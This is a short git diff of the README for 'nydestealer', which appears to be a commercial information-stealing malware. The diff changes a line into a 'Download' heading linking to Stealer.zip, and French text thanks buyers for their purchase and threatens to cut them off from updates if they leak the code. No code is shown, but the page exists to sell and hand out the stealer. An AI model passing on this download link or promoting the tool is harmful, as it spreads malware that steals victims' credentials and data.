@@ -1,6 +1,6 @@
 # nydestealer
 
-Release : [Stealer.zip](https://github.com/nydehunter/nydestealer/files/13719128/Stealer.zip)
+# Download : [Stealer.zip](https://github.com/nydehunter/nydestealer/files/13719128/Stealer.zip)
 
 1. Tout d'abord, merci d'avoir acheté notre fichier. Sachez que toute divulgation de notre code pourrait vous conduire à un bannissement des futures mises à jour de notre Stealer.
 
